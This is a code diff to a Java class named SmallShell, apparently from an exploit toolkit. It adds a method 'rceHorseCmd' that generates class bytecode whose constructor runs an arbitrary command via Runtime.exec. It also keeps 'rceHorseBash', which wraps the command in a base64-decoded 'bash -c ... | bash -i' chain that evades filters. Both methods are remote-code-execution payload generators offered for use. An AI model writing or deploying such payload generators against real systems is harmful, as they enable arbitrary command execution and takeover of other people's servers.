@@ -74,7 +74,17 @@ public class SmallShell {
         calc.defrost();
         return bytes;
     }
-    public static byte[] rceHorse(String cmd) throws Exception{
+
+    public static byte[] rceHorseCmd(String cmd) throws Exception{
+        String s = "public A(){          try {\n" +
+                "            Runtime.getRuntime().exec(\""+cmd+"\");\n" +
+                "        } catch (Exception e) {\n" +
+                "            \n" +
+                "        }             " +
+                "}";
+        return makeByte(s);
+    }
+    public static byte[] rceHorseBash(String cmd) throws Exception{
         cmd = Base64.getEncoder().encodeToString(cmd.getBytes());
         String s = "public A(){          try {\n" +
                 "            Runtime.getRuntime().exec(\"bash -c {echo,"+cmd+"}|{base64,-d}|{bash,-i}\");\n" +
